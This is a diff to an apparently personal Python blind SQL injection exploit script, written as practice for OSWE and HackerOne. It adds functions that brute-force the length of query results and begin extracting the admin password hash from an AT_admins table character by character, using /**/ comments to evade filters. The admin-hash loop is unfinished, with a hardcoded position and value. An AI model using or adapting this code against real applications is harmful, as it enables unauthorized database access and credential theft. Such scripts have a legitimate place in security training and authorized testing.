@@ -79,6 +79,21 @@ def getTableNames(ip, num_tables):
     print("(+) Exfiltrated tables", table_names)
     return table_names
 '''
+Realistically instead of a linear search we should use a binary search,
+but hey this isn't algorithm analysis.
+Note to self it might be practical to have something like that coded up when we do hackerone and oswe exam. Get length is a pretty common operation in exfiltration and reducing the amount of time it takes to search is .... better.
+'''
+def getLength(ip, sub_sub_query, lowbound, upperbound):
+    for i in range(lowbound, upperbound):
+        sub_query = F"select/**/length(({sub_sub_query}))={i}"
+        if(searchFriends_blind(ip,sub_query,debug=False)):
+            print(F"(+)Length of result from expression [{sub_sub_query}]: {i}")
+            return i
+def getAdminHashes(ip, user, hash_len):
+    for i in range(1,hash_len + 1):
+        for j in range(32, 126):
+            sub_query = F"select/**/ascii(substring((select/**/password/**/from/**/AT_admins/**/where login='admin'),1,1))='102'"
+'''
 def getNumberOfDBAdmins(ip):
     pass
 def getDbAdmins(ip, num_admins):
@@ -158,6 +173,8 @@ def main():
     #currentUserIsDbAdmin(ip,'root@localhost')
     #num_tables = getNumberOfTables(ip,0,250)
     #getTableNames(ip, num_tables)
+    admin_hash = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
+    getLength(ip,admin_hash, 1, 100)
     
 if __name__ == "__main__":
     main()
